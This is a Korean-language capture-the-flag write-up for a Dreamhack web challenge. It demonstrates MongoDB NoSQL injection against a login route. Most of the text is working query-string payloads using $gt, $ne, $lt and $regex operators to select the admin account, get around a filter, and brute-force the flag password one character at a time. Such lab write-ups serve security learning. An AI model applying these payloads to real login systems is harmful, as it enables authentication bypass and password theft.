아래와 같이 요청을 보내면 guest 가 출력이 된다.
/login?uid[$gt]=adm&upw[$ne]= 
// result: guest 

guest 빼고 다른 결과를 보기 위해 $ne를 이용하여 결과 값에서 guest를 제외시킨다.
이번에는 dreamhack 이 출력된다.
/login?uid[$gt]=adm&uid[$ne]=guest&upw[$ne]=
// result: dreamhack
  

이번에는 $lt 를 이용하여 d 라는 문자 보다 작은 값을 출력하게끔 만든다.
그럼 dreamhack < d 는 false 이므로 dreamhack 이 출력 되지 않는다. 
결과를 보면 성공적으로 admin 이 출력된다.
/login?uid[$gt]=adm&uid[$ne]=guest&uid[$lt]=d&upw[$ne]= 
// result: admin

*코드에도 대략적으로 나와있듯이 
웹 속에 포함되어있는 db를 이용해서 injection을 통해 flag를 뽑아내는 것이 
이 문제의 목적이라고 할 수 있다. 
위에서 나열된 대략적 문장들로 기본적인 정보는 얻을 수 있었다. 
기본적인 정보를 뽑아낼 수 있으면, 문제가 되는 부분은 
'upw=' 즉 패스워드라고 할 수 있다. 
코드를 보면 패스워드는 주어져 있다.  DH{32alphanumeric}
그러면 도대체 뭐가 문제일까? 
filter = function(data) 이하를 보면 위의 패스워드에 대해서 필터가 걸려있다는 것을 알 수 있다. 
여기서 필요한 것이 바로 $regex이다. 
$regex를 이용하면 guest를 필터링 하고있는 것을 우회할 수 있다.
id[$regex]=g.est&pw[$regex]=gu.st

이런 것을 이용해서 NoSQL injection 공격을 진행 할 수 있다.
만약 찾고자 하는 ID가 admin이고 비밀번호는 모를 경우

id[$eq]=admin&pw[$regex]=a
id[$eq]=admin&pw[$regex]=b
id[$eq]=admin&pw[$regex]=c
와 같이 injection 공격을 수행할 수 있다. 이를 통해서 원하는 PW를 얻어낼 수 있다.
main.js 소스에서 보면 uid 와 upw 는 따로 자료형이 고정되어있지 않은 상태이다. 
이 점을 십분활용하여, mongoDB 에서는 오브젝트 타입으로 인자를 넘기는 것이 가능하다!

*거의 답까지 다 온 문장들 
login?uid[$ne]=guest&upw[$regex]=[D]H{~~~~~~
login?uid[$gt]=adm&uid[$ne]=guest&uid[$lt]=d&upw[$regex]=[D]H{~~~~~~
/login?uid[$gt]=adm&uid[$ne]=guest&uid[$lt]=d&upw[$regex]=[D]H{~~~~~~
/login?uid[$gt]=adm&uid[$ne]=guest&uid[$lt]=d&upw[$regex]=[D]H{...
/login?uid[$gt]=adm&uid[$ne]=guest&uid[$lt]=d&upw[$regex]={
